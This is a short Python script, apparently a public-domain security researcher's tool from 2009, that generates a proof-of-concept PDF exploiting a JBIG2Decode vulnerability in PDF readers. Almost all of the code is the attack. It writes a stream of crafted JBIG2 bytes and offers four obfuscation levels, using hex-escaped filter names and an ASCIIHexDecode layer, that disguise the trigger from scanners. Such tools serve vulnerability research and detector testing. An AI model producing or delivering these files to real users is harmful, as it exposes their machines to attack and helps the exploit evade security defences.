#!/usr/bin/python

# make-pdf-jbig2, create a JBIG2Decode vulnerability PoC PDF document
# requires module mPDF.py
# Source code put in public domain by Didier Stevens, no Copyright
# https://DidierStevens.com
# Use at your own risk
#
# History:
#  
#  2009/03/02: start

__author__ = 'Didier Stevens'
__version__ = '0.0.1'
__date__ = '2009/03/02'

import mPDF
import optparse

def Usage(oParser):
    oParser.print_help()
    print ''
    print '  make-pdf-jbig2, create a JBIG2Decode vulnerability PoC PDF document'
    print '  Source code put in the public domain by Didier Stevens, no Copyright'
    print '  Use at your own risk'
    print '  https://DidierStevens.com'

def Main():
    """make-pdf-jbig2, create a JBIG2Decode vulnerability PoC PDF document
    """

    oParser = optparse.OptionParser(usage='usage: %prog [options] pdf-file', version='%prog ' + __version__)
    oParser.add_option('-o', '--obfuscation', default='0', help='select obfuscation level 0-3 (default 0)')
    (options, args) = oParser.parse_args()

    if len(args) != 1:
        Usage(oParser)

    elif not options.obfuscation in ['0', '1', '2', '3']:
        Usage(oParser)
    
    else:
        oPDF = mPDF.cPDF(args[0])
    
        oPDF.header()
    
        oPDF.indirectobject(1, 0, '<<\n /Type /Catalog\n /Outlines 2 0 R\n /Pages 3 0 R\n>>')
        oPDF.indirectobject(2, 0, '<<\n /Type /Outlines\n /Count 0\n>>')
        oPDF.indirectobject(3, 0, '<<\n /Type /Pages\n /Kids [4 0 R]\n /Count 1\n>>')
        oPDF.indirectobject(4, 0, '<<\n /Type /Page\n /Parent 3 0 R\n /MediaBox [0 0 612 792]\n /Contents 5 0 R\n /Resources <<\n             /ProcSet [/PDF /Text]\n             /Font << /F1 6 0 R >>\n            >>\n>>')
        if options.obfuscation == '0':
            oPDF.stream(5, 0, '\x00\x00\x00\x01\x40\x00\x00\x33\x33\x33', '<</Length %d /Filter /JBIG2Decode>>')
        elif options.obfuscation == '1':
            oPDF.stream(5, 0, '\x00\x00\x00\x01\x40\x00\x00\x33\x33\x33', '<</Length %d /Filter /JBIG#32Decode>>')
        elif options.obfuscation == '2':
            oPDF.stream(5, 0, '00000001400000333333>', '<</Length %d /Filter [/ASCIIHexDecode /JBIG2Decode]>>')
        elif options.obfuscation == '3':
            oPDF.stream(5, 0, '00000001400000333333>', '<</Length %d /Filter [/ASCIIHexDecode /JBIG#32Decode]>>')
        oPDF.indirectobject(6, 0, '<<\n /Type /Font\n /Subtype /Type1\n /Name /F1\n /BaseFont /Helvetica\n /Encoding /MacRomanEncoding\n>>')
    
        oPDF.xrefAndTrailer('1 0 R')

if __name__ == '__main__':
    Main()
